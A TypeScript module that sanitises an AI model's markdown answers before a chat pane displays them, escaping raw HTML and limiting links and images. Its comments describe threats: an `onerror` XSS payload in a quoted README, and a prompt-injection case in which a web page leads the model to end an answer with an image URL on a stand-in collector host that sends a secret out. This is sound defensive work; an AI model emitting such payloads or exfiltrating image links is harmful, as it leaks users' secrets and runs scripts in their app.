import hljs from 'highlight.js/lib/common';
import { Marked, type Tokens } from 'marked';

// What Claude writes, as HTML the chat pane can put on screen. Everything that arrives here is text a
// model produced from files, web pages and tool output nobody has read, so the HTML it is allowed to
// carry is decided here and nowhere else: raw HTML in the text is shown as text, a link keeps only an
// address that opens in the browser, and an image only one carried inline.
//
// What getting it wrong looks like: a README Claude quotes holds `<img src=x onerror=...>`, and the
// script runs inside the window that owns every shell.

const LINK_PROTOCOLS = ['http:', 'https:', 'mailto:'];

function escapeHtml(text: string): string {
  return text.replace(/[&<>"']/g, (character) => `&#${character.charCodeAt(0)};`);
}

// Only an absolute address with a protocol on the list. A relative one names a file in the project,
// and the window would read it as a path inside the app's own bundle.
export function safeLink(href: string): string | null {
  try {
    return LINK_PROTOCOLS.includes(new URL(href).protocol) ? href : null;
  } catch {
    return null;
  }
}

// Only an image carried inline. One from the web is fetched the moment it is drawn, so a page Claude
// read could have it end an answer with `![](https://collector.example/?d=<a secret>)` and the screen
// would send the secret out with no tool call asked about. One on the disk is a way to ask the window
// whether a file exists. Either is shown as a link instead, which opens only on a click.
export function safeImage(href: string): string | null {
  return /^data:image\/(png|jpeg|gif|webp);base64,[A-Za-z0-9+/=]+$/.test(href) ? href : null;
}

function highlightCode(code: string, language: string | undefined): string {
  const known = language && hljs.getLanguage(language) ? language : null;
  // ponytail: no guessing at an unlabelled block — highlightAuto runs every grammar over it, which
  // costs more than a long answer is worth. Add it when unlabelled blocks turn out to be common.
  return known ? hljs.highlight(code, { language: known }).value : escapeHtml(code);
}

const marked = new Marked({
  gfm: true,
  renderer: {
    html: ({ text }: Tokens.HTML | Tokens.Tag) => escapeHtml(text),
    code: ({ text, lang }: Tokens.Code) => {
      const language = lang?.split(/\s/)[0];
      return `<pre class="chat-code"><code class="hljs">${highlightCode(text, language)}</code></pre>`;
    },
    link({ href, title, tokens }: Tokens.Link) {
      const inner = this.parser.parseInline(tokens);
      const safe = safeLink(href);
      if (!safe) return inner;
      return `<a href="${escapeHtml(safe)}"${title ? ` title="${escapeHtml(title)}"` : ''}>${inner}</a>`;
    },
    image({ href, text }: Tokens.Image) {
      const safe = safeImage(href);
      if (safe) return `<img src="${escapeHtml(safe)}" alt="${escapeHtml(text)}">`;
      const link = safeLink(href);
      return link ? `<a href="${escapeHtml(link)}">${escapeHtml(text || link)}</a>` : escapeHtml(text);
    },
  },
});

export function renderMarkdown(text: string): string {
  return marked.parse(text, { async: false });
}
